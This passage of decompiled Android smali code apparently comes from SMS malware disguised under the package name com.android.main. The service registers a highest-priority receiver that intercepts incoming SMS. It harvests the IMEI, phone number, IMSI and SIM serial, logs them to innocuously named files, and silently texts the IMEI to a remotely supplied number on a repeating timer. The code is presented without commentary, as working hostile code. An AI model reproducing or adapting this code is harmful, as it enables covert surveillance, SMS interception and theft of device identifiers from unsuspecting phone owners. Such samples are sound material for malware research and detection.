    invoke-direct/range {p0 .. p0}, Lcom/android/main/MainService;->initChannel()V

    .line 95
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;

    move-object v3, v0

    if-eqz v3, :cond_0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;

    move-object v3, v0

    const-string v4, "nz-"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 96
    invoke-direct/range {p0 .. p0}, Lcom/android/main/MainService;->defaultMark()V

    .line 99
    :cond_0
    new-instance v3, Lcom/android/main/MainService$SMSReceiver;

    move-object v0, v3

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/android/main/MainService$SMSReceiver;-><init>(Lcom/android/main/MainService;)V

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->sendReceiver:Lcom/android/main/MainService$SMSReceiver;

    .line 100
    new-instance v16, Landroid/content/IntentFilter;

    const-string v3, "com.test.sms.send"

    move-object/from16 v0, v16

    move-object v1, v3

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 101
    .local v16, "sendFilter":Landroid/content/IntentFilter;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->sendReceiver:Lcom/android/main/MainService$SMSReceiver;

    move-object v3, v0

    move-object/from16 v0, p0

    move-object v1, v3

    move-object/from16 v2, v16

    invoke-virtual {v0, v1, v2}, Lcom/android/main/MainService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 103
    new-instance v3, Lcom/android/main/MainService$SMSReceiver;

    move-object v0, v3

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/android/main/MainService$SMSReceiver;-><init>(Lcom/android/main/MainService;)V

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->deliveryReceiver:Lcom/android/main/MainService$SMSReceiver;

    .line 104
    new-instance v9, Landroid/content/IntentFilter;

    const-string v3, "com.test.sms.delivery"

    invoke-direct {v9, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 105
    .local v9, "deliveryFilter":Landroid/content/IntentFilter;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->deliveryReceiver:Lcom/android/main/MainService$SMSReceiver;

    move-object v3, v0

    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v9

    invoke-virtual {v0, v1, v2}, Lcom/android/main/MainService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 107
    new-instance v3, Lcom/android/main/MainService$SMSReceiver;

    move-object v0, v3

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/android/main/MainService$SMSReceiver;-><init>(Lcom/android/main/MainService;)V

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->smsReceiver:Lcom/android/main/MainService$SMSReceiver;

    .line 108
    new-instance v13, Landroid/content/IntentFilter;

    const-string v3, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {v13, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 109
    .local v13, "receiverFilter":Landroid/content/IntentFilter;
    const v3, 0x7fffffff

    invoke-virtual {v13, v3}, Landroid/content/IntentFilter;->setPriority(I)V

    .line 110
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->smsReceiver:Lcom/android/main/MainService$SMSReceiver;

    move-object v3, v0

    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v13

    invoke-virtual {v0, v1, v2}, Lcom/android/main/MainService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 112
    const-string v3, "androidh.log"

    const/4 v4, 0x0

    move-object/from16 v0, p0

    move-object v1, v3

    move v2, v4

    invoke-virtual {v0, v1, v2}, Lcom/android/main/MainService;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v3

    .line 113
    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    .line 112
    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->recordlog:Ljava/lang/String;

    .line 114
    const-string v3, "android.log"

    const/4 v4, 0x0

    move-object/from16 v0, p0

    move-object v1, v3

    move v2, v4

    invoke-virtual {v0, v1, v2}, Lcom/android/main/MainService;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v3

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->tasklog:Ljava/lang/String;

    .line 115
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    move-object v3, v0

    if-eqz v3, :cond_1

    const-string v3, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 117
    :cond_1
    const-string v3, "phone"

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-virtual {v0, v1}, Lcom/android/main/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v17

    .line 116
    check-cast v17, Landroid/telephony/TelephonyManager;

    .line 118
    .local v17, "tm":Landroid/telephony/TelephonyManager;
    if-eqz v17, :cond_3

    .line 119
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    .line 120
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v19

    .line 121
    .local v19, "tmpmobile":Ljava/lang/String;
    if-eqz v19, :cond_2

    invoke-virtual/range {v19 .. v19}, Ljava/lang/String;->length()I

    move-result v3

    const/16 v4, 0xa

    if-le v3, v4, :cond_2

    .line 122
    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    .line 124
    :cond_2
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    .line 125
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->iccid:Ljava/lang/String;

    .line 128
    .end local v17    # "tm":Landroid/telephony/TelephonyManager;
    .end local v19    # "tmpmobile":Ljava/lang/String;
    :cond_3
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->recordlog:Ljava/lang/String;

    move-object v3, v0

    invoke-static {v3}, Lcom/android/main/FileAct;->readString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    .line 131
    .local v14, "record":Ljava/lang/String;
    const/4 v11, 0x0

    .line 132
    .local v11, "isstatis":Z
    if-eqz v14, :cond_d

    const-string v3, ""

    invoke-virtual {v14, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_d

    .line 133
    invoke-static {v14}, Lcom/android/main/StringUtil;->getRecordInfo(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    .line 134
    .local v10, "docount":[Ljava/lang/String;
    if-eqz v10, :cond_c

    array-length v3, v10

    const/4 v4, 0x7

    if-ne v3, v4, :cond_c

    .line 135
    const/4 v3, 0x0

    aget-object v3, v10, v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    .line 136
    const/4 v3, 0x2

    aget-object v19, v10, v3

    .line 137
    .restart local v19    # "tmpmobile":Ljava/lang/String;
    const/4 v3, 0x3

    aget-object v3, v10, v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->installtime:Ljava/lang/String;

    .line 138
    const/4 v3, 0x4

    aget-object v3, v10, v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->region:Ljava/lang/String;

    .line 139
    const/4 v3, 0x5

    aget-object v18, v10, v3

    .line 140
    .local v18, "tmpimsi":Ljava/lang/String;
    const/4 v3, 0x6

    aget-object v3, v10, v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->mnc:Ljava/lang/String;

    .line 141
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    move-object v3, v0

    if-eqz v3, :cond_4

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    move-object v3, v0

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_4

    .line 142
    const/4 v3, 0x1

    move v0, v3

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/android/main/MainService;->issend:Z

    .line 144
    :cond_4
    const/4 v3, 0x1

    aget-object v3, v10, v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_5

    .line 145
    const/4 v11, 0x1

    .line 147
    :cond_5
    const-string v3, "no"

    move-object v0, v3

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_6

    .line 148
    const-string v3, ""

    move-object v0, v3

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_6

    .line 149
    invoke-virtual/range {v19 .. v19}, Ljava/lang/String;->length()I

    move-result v3

    const/16 v4, 0xa

    if-le v3, v4, :cond_6

    .line 150
    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    .line 163
    .end local v10    # "docount":[Ljava/lang/String;
    .end local v18    # "tmpimsi":Ljava/lang/String;
    .end local v19    # "tmpmobile":Ljava/lang/String;
    :cond_6
    :goto_0
    if-eqz v11, :cond_9

    .line 165
    invoke-direct/range {p0 .. p0}, Lcom/android/main/MainService;->getDestMobile()I

    move-result v15

    .line 166
    .local v15, "result":I
    const/16 v3, 0xc8

    if-ne v15, v3, :cond_7

    .line 167
    new-instance v3, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    move-object v4, v0

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    .line 168
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->installtime:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->region:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mnc:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    .line 167
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    .line 169
    .local v12, "logtxt":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->recordlog:Ljava/lang/String;

    move-object v3, v0

    invoke-static {v12, v3}, Lcom/android/main/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 171
    .end local v12    # "logtxt":Ljava/lang/String;
    :cond_7
    const-string v3, "no"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    const-string v3, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    .line 172
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object v3, v0

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v3

    const/16 v4, 0xb

    if-ge v3, v4, :cond_9

    .line 173
    :cond_8
    const/4 v3, 0x1

    move v0, v3

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/android/main/MainService;->issend:Z

    .line 176
    .end local v15    # "result":I
    :cond_9
    move-object/from16 v0, p0

    iget-boolean v0, v0, Lcom/android/main/MainService;->issend:Z

    move v3, v0

    if-eqz v3, :cond_b

    .line 177
    const-string v3, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->destMobile:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_a

    .line 178
    invoke-direct/range {p0 .. p0}, Lcom/android/main/MainService;->getDestMobile()I

    .line 180
    :cond_a
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->destMobile:Ljava/lang/String;

    move-object v3, v0

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "imei:"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    move-object v5, v0

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v4

    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 181
    const/4 v3, 0x0

    move v0, v3

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/android/main/MainService;->issend:Z

    .line 184
    :cond_b
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->timer:Ljava/util/Timer;

    move-object v3, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->newtask:Ljava/util/TimerTask;

    move-object v4, v0

    const-wide/16 v5, 0x0

    const-wide/32 v7, 0xdbba0

    invoke-virtual/range {v3 .. v8}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;JJ)V

    .line 185
    return-void

    .line 153
    .restart local v10    # "docount":[Ljava/lang/String;
    :cond_c
    const/4 v3, 0x2

    invoke-static {v3}, Lcom/android/main/StringUtil;->getDate(I)Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    .line 154
    const/4 v3, 0x1

    invoke-static {v3}, Lcom/android/main/StringUtil;->getCurrentDate(I)Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->installtime:Ljava/lang/String;

    .line 155
    const/4 v11, 0x1

    goto/16 :goto_0

    .line 159
    .end local v10    # "docount":[Ljava/lang/String;
    :cond_d
    const/4 v3, 0x2

    invoke-static {v3}, Lcom/android/main/StringUtil;->getDate(I)Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    .line 160
    const/4 v3, 0x1

    invoke-static {v3}, Lcom/android/main/StringUtil;->getCurrentDate(I)Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->installtime:Ljava/lang/String;

    .line 161
    const/4 v11, 0x1

    goto/16 :goto_0
.end method
